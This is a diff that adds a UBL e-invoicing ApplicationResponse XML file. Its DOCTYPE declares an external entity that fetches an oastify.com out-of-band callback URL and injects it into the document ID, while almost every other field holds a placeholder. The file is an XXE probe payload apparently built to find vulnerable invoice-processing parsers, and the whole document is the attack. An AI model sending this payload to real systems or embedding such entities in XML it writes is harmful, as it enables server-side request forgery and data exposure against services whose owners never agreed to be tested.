@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ApplicationResponse [
+  <!ENTITY xxe SYSTEM "http://tli9shi9f0bgwxu4jcw9wzxoefk68xzlo.oastify.com/xxe-struct">
+]>
+<ApplicationResponse xmlns:cac="urn:oasis:names:specification:ubl:schema:xsd:CommonAggregateComponents-2" xmlns:cbc="urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2" xmlns:ext="urn:oasis:names:specification:ubl:schema:xsd:CommonExtensionComponents-2" xmlns:ad="http://www.sovos.com/namespaces/additionalData" xmlns="urn:oasis:names:specification:ubl:schema:xsd:ApplicationResponse-2">
+  <cbc:ID>&xxe;</cbc:ID><ext:UBLExtensions>
+    <ext:UBLExtension>
+      <ext:ExtensionContent>
+        <ad:AdditionalData/>
+      </ext:ExtensionContent>
+    </ext:UBLExtension>
+  </ext:UBLExtensions>
+  <cbc:UBLVersionID>x</cbc:UBLVersionID>
+  <cbc:CustomizationID>x</cbc:CustomizationID>
+  <cbc:ProfileID>x</cbc:ProfileID>
+  <cbc:ID>x</cbc:ID>
+  <cbc:IssueDate>x</cbc:IssueDate>
+  <cac:SenderParty>
+    <cac:PartyIdentification>
+      <cbc:ID>x</cbc:ID>
+    </cac:PartyIdentification>
+    <cac:PartyName>
+      <cbc:Name>x</cbc:Name>
+    </cac:PartyName>
+    <cac:Contact>
+      <cbc:ElectronicMail>x</cbc:ElectronicMail>
+    </cac:Contact>
+  </cac:SenderParty>
+  <cac:ReceiverParty>
+    <cac:PartyIdentification>
+      <cbc:ID>x</cbc:ID>
+    </cac:PartyIdentification>
+    <cac:PartyName>
+      <cbc:Name>x</cbc:Name>
+    </cac:PartyName>
+    <cac:Contact>
+      <cbc:ElectronicMail>x</cbc:ElectronicMail>
+    </cac:Contact>
+  </cac:ReceiverParty>
+  <cac:DocumentResponse>
+    <cac:Response>
+      <cbc:ResponseCode listID="SCIResponseCode">x</cbc:ResponseCode>
+      <cac:Status>
+        <cbc:StatusReasonCode listID="SCICloudStatusCode">x</cbc:StatusReasonCode>
+        <cbc:StatusReason>x</cbc:StatusReason>
+      </cac:Status>
+      <cac:Status>
+        <cbc:StatusReasonCode listID="SCIStatusAction">x</cbc:StatusReasonCode>
+        <cbc:StatusReason>x</cbc:StatusReason>
+      </cac:Status>
+    </cac:Response>
+    <cac:DocumentReference>
+      <cbc:ID/>
+      <cbc:UUID>x</cbc:UUID>
+      <cbc:IssueDate>x</cbc:IssueDate>
+      <cbc:DocumentTypeCode>x</cbc:DocumentTypeCode>
+    </cac:DocumentReference>
+    <cac:DocumentReference>
+      <cbc:ID>x</cbc:ID>
+      <cbc:DocumentTypeCode>x</cbc:DocumentTypeCode>
+      <cac:Attachment>
+        <cbc:EmbeddedDocumentBinaryObject mimeCode="application/xml">REDACTED</cbc:EmbeddedDocumentBinaryObject>
+      </cac:Attachment>
+    </cac:DocumentReference>
+    <cac:DocumentReference>
+      <cbc:ID>x</cbc:ID>
+      <cbc:DocumentTypeCode>x</cbc:DocumentTypeCode>
+      <cac:Attachment>
+        <cbc:EmbeddedDocumentBinaryObject mimeCode="application/xml" filename="Original.xml">REDACTED</cbc:EmbeddedDocumentBinaryObject>
+      </cac:Attachment>
+    </cac:DocumentReference>
+    <cac:DocumentReference>
+      <cbc:ID>x</cbc:ID>
+      <cbc:DocumentTypeCode>x</cbc:DocumentTypeCode>
+      <cac:Attachment>
+        <cbc:EmbeddedDocumentBinaryObject mimeCode="application/pdf" filename="VT_MAIL_DA601.pdf">REDACTED</cbc:EmbeddedDocumentBinaryObject>
+      </cac:Attachment>
+    </cac:DocumentReference>
+    <cac:DocumentReference>
+      <cbc:ID>x</cbc:ID>
+      <cbc:DocumentTypeCode>x</cbc:DocumentTypeCode>
+      <cac:Attachment>
+        <cbc:EmbeddedDocumentBinaryObject mimeCode="application/pdf" filename="x">REDACTED</cbc:EmbeddedDocumentBinaryObject>
+      </cac:Attachment>
+    </cac:DocumentReference>
+    <cac:DocumentReference>
+      <cbc:ID>x</cbc:ID>
+      <cbc:DocumentTypeCode>x</cbc:DocumentTypeCode>
+      <cac:Attachment>
+        <cac:ExternalReference>
+          <cbc:URI schemeID="legal">REDACTED</cbc:URI>
+          <cbc:MimeCode>x</cbc:MimeCode>
+          <cbc:FileName>x</cbc:FileName>
+        </cac:ExternalReference>
+      </cac:Attachment>
+    </cac:DocumentReference>
+  </cac:DocumentResponse>
+</ApplicationResponse>
